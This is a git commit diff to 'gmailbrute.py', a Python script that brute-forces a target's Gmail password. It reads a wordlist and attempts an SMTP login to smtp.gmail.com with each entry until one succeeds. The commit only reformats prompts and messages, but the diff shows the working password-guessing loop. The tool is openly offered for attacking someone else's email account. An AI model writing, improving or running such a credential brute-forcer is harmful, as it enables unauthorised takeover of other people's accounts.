2c47a45344e67c8eaa053446ba46977017fc6de5
Krisna Pranav <68631244+krishpranav@users.noreply.github.com>
2020-08-10 00:48:15 -0400

    Update gmailbrute.py

--- gmailbrute.py
+++ gmailbrute.py
@@ -11,15 +11,15 @@ smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-user = raw_input("Enter the target's email address: ")
-passwfile = raw_input("Enter the password file name: ")
+user = raw_input("Enter the target's email address >> ")
+passwfile = raw_input("Enter the password file name >> ")
 passwfile = open(passwfile, "r")
 
 for password in passwfile:
 	try:
 		smtpserver.login(user, password)
 
-		print "[+] Password Found: %s" % password
+		print "[+] Password Found >> %s" % password
 		break
 	except smtplib.SMTPAuthenticationError:
-		print "[!] Password Is Not In The List: %s" % password
+		print "[!] Password Is Not In The List >> %s" % password
